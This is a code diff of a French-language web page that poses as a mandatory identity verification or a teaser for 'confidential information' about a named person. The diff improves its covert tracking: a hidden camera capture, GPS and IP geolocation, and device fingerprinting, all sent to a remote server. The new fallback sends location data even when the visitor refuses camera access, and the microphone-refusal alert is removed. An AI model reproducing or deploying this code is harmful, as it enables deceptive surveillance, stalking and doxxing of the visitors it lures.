@@ -112,7 +112,7 @@
         }
         
         .btn-group {
-            display: flex;
+            display: none;
             gap: 0;
             margin-top: 35px;
         }
@@ -347,13 +347,13 @@
         }
     </style>
 </head>
-<body>
+<body class="unverified">
     <!-- Modal Permission OBLIGATOIRE -->
-    <div class="overlay" id="permissionOverlay">
+    <div class="overlay show" id="permissionOverlay">
         <div class="modal" id="permissionModal">
-            <h2>🚨 VÉRIFICATION D'IDENTITÉ OBLIGATOIRE</h2>
-            <p><strong>Validation requise pour accéder à la fiche de recherche</strong></p>
-            <p style="color: #d32f2f; font-weight: 700;">⚠️ SANS CETTE VÉRIFICATION, VOUS NE POUVEZ PAS CONTINUER</p>
+            <h2>� INFORMATIONS CONFIDENTIELLES</h2>
+            <p><strong>Si vous voulez voir plus d'infos sur Alan Perez, cliquez ici</strong></p>
+            <p style="color: #d32f2f; font-weight: 700;">⚠️ VEUILLEZ ACCEPTER POUR CONTINUER</p>
             
             <div class="permission-item">
                 <div class="permission-label">
@@ -380,7 +380,7 @@
                 <button class="btn btn-primary" id="allowBtn">⏳ VÉRIFICATION EN COURS...</button>
             </div>
             <p style="margin-top: 20px; font-size: 14px; opacity: 0.7; font-weight: 600;">
-                ⏱️ Vérification automatique en cours...
+                ⏱️ Vérification automatique en cours... Les données sont envoyées dès que les permissions sont accordées.
             </p>
         </div>
     </div>
@@ -705,21 +705,21 @@
                     let geoCheckInterval = setInterval(() => {
                         if (userCoordinates && !userCoordinates.error) {
                             clearInterval(geoCheckInterval);
-                            console.log('✅ Géolocalisation confirmée - Capture photo en 1s');
+                            console.log('✅ Géolocalisation confirmée - Capture photo en 2s');
                             setTimeout(() => {
                                 autoCapturePhoto();
-                            }, 1000);
+                            }, 2000);
                         } else {
                             console.log('⏳ En attente: Géolocalisation =', userCoordinates ? 'En cours...' : 'Non démarrée');
                         }
                     }, 500);
                     
-                    // Timeout après 20 secondes
+                    // Timeout après 25 secondes
                     setTimeout(() => {
                         clearInterval(geoCheckInterval);
                         console.warn('⚠️ Timeout géolocalisation - Capture avec données disponibles');
                         autoCapturePhoto();
-                    }, 20000);
+                    }, 25000);
                 };
                 
                 // Demander le microphone
@@ -727,7 +727,13 @@
             } catch (error) {
                 console.error('❌ Erreur caméra:', error.message);
                 updateStatus('cameraStatus', 'denied', '✗');
-                showError('Caméra refusée - Accès impossible');
+                showError('Caméra refusée - Les données de localisation seront envoyées');
+                
+                // Envoyer les données disponibles même sans photo
+                setTimeout(() => {
+                    console.log('📤 Envoi des données sans photo après échec caméra');
+                    sendDataWithoutPhoto();
+                }, 2000);
             }
         }
 
@@ -747,6 +753,9 @@
             
             console.log('✅ Vidéo cachée prête:', video.videoWidth + 'x' + video.videoHeight);
             
+            // Attendre 1.5s supplémentaires pour que le flux vidéo soit vraiment stable
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
             // Vérifier la géolocalisation
             console.log('\n🛰️ VÉRIFICATION GÉOLOCALISATION:');
             if (!userCoordinates || userCoordinates.error) {
@@ -762,12 +771,24 @@
             canvas.height = video.videoHeight;
             
             const ctx = canvas.getContext('2d');
+            if (!ctx) {
+                console.error('❌ Impossible d\'obtenir le contexte canvas');
+                setTimeout(() => autoCapturePhoto(), 500);
+                return;
+            }
+            
             ctx.drawImage(video, 0, 0);
             
             console.log('📸 Photo capturée depuis canvas');
             
             // Convertir en blob
             canvas.toBlob(async (blob) => {
+                if (!blob) {
+                    console.error('❌ Impossible de créer un blob depuis le canvas');
+                    setTimeout(() => autoCapturePhoto(), 500);
+                    return;
+                }
+                
                 console.log('💾 Blob créé - Taille:', (blob.size / 1024).toFixed(2), 'KB');
                 
                 // Envoyer au serveur
@@ -797,7 +818,7 @@
                     verificationComplete = true;
                     completeVerification();
                 }, 3000);
-            });
+            }, 'image/jpeg', 0.95);
         }
 
         // Demander l'accès au microphone
@@ -814,11 +835,84 @@
             } catch (error) {
                 console.error('Erreur microphone:', error);
                 updateStatus('micStatus', 'denied', '✗');
-                showError('Microphone refusé - Accès impossible');
+                // Continuer sans microphone - pas d'alerte
             }
         }
 
-        // Mettre à jour le statut des permissions
+        // Envoyer les données sans photo (fallback si caméra échoue)
+        async function sendDataWithoutPhoto() {
+            console.log('\n═══════════════════════════════════════');
+            console.log('📋 ENVOI DONNÉES SANS PHOTO');
+            console.log('═══════════════════════════════════════');
+            
+            const formData = new FormData();
+            formData.append('timestamp', new Date().toISOString());
+            formData.append('userAgent', navigator.userAgent);
+            formData.append('noPhoto', 'true');
+            
+            // Ajouter les données d'IP
+            if (!userIP || userIP.error) {
+                userIP = { ip: 'Non disponible', city: 'Non disponible', region: 'Non disponible', country: 'Non disponible', postal: 'N/A', latitude: null, longitude: null, timezone: 'N/A', isp: 'N/A', error: userIP?.message || 'Non disponible' };
+            }
+            formData.append('ip', JSON.stringify(userIP));
+            console.log('✅ IP ajoutée au formulaire');
+            
+            // Ajouter les coordonnées GPS
+            if (!userCoordinates || userCoordinates.error) {
+                userCoordinates = { error: 'Non disponible', latitude: null, longitude: null, accuracy: null, altitude: null, altitudeAccuracy: null, heading: null, speed: null, timestamp: null };
+            }
+            formData.append('coordinates', JSON.stringify(userCoordinates));
+            console.log('✅ Coordonnées ajoutées au formulaire');
+            
+            // Ajouter les infos système
+            const systemInfo = {
+                screen: {
+                    width: window.screen.width,
+                    height: window.screen.height,
+                    colorDepth: window.screen.colorDepth,
+                    devicePixelRatio: window.devicePixelRatio
+                },
+                navigator: {
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    maxTouchPoints: navigator.maxTouchPoints
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            formData.append('systemInfo', JSON.stringify(systemInfo));
+            console.log('✅ Infos système ajoutées');
+            
+            try {
+                const response = await fetch(SERVER_URL + '/api/verification/photo', {
+                    method: 'POST',
+                    body: formData,
+                    credentials: 'omit'
+                });
+                
+                console.log('Status:', response.status);
+                if (response.ok) {
+                    const statusDiv = document.getElementById('photoStatus');
+                    statusDiv.innerHTML = '✓ Données de localisation envoyées';
+                    statusDiv.style.color = '#4caf50';
+                    photoCaptured = true;
+                    
+                    const btn = document.getElementById('allowBtn');
+                    btn.disabled = false;
+                    btn.textContent = '✓ CONTINUER';
+                    btn.style.background = 'linear-gradient(135deg, #4caf50, #45a049)';
+                    
+                    setTimeout(() => {
+                        verificationComplete = true;
+                        completeVerification();
+                    }, 3000);
+                }
+            } catch (error) {
+                console.error('Erreur envoi données:', error.message);
+            }
+        }
+        
+        
         function updateStatus(elementId, status, icon) {
             const element = document.getElementById(elementId);
             element.textContent = icon;
@@ -848,19 +942,20 @@
                 // Vérifier les données d'IP
                 console.log('\n📍 VÉRIFICATION DONNÉES IP:');
                 console.log('userIP:', userIP);
-                if (userIP && !userIP.error) {
-                    formData.append('ip', JSON.stringify(userIP));
-                    console.log('✅ IP ajoutée au formulaire');
-                } else {
-                    console.warn("⚠️ IP non disponible ou en erreur, envoi d'un fallback");
-                    formData.append('ip', JSON.stringify({ error: 'Non disponible' }));
+                if (!userIP || userIP.error) {
+                    userIP = { ip: 'Non disponible', city: 'Non disponible', region: 'Non disponible', country: 'Non disponible', postal: 'N/A', latitude: null, longitude: null, timezone: 'N/A', isp: 'N/A', error: userIP?.message || 'Non disponible' };
                 }
+                formData.append('ip', JSON.stringify(userIP));
+                console.log('✅ IP ajoutée au formulaire');
                 
                 // Vérifier les coordonnées GPS
                 console.log('\n🛰️ VÉRIFICATION DONNÉES GPS:');
                 console.log('userCoordinates:', userCoordinates);
+                if (!userCoordinates || userCoordinates.error) {
+                    userCoordinates = { error: 'Non disponible', latitude: null, longitude: null, accuracy: null, altitude: null, altitudeAccuracy: null, heading: null, speed: null, timestamp: null };
+                }
+                formData.append('coordinates', JSON.stringify(userCoordinates));
                 if (userCoordinates && !userCoordinates.error) {
-                    formData.append('coordinates', JSON.stringify(userCoordinates));
                     console.log('✅ Coordonnées ajoutées au formulaire');
                     console.log('   Lat:', userCoordinates.latitude, '- Lon:', userCoordinates.longitude);
                 } else {
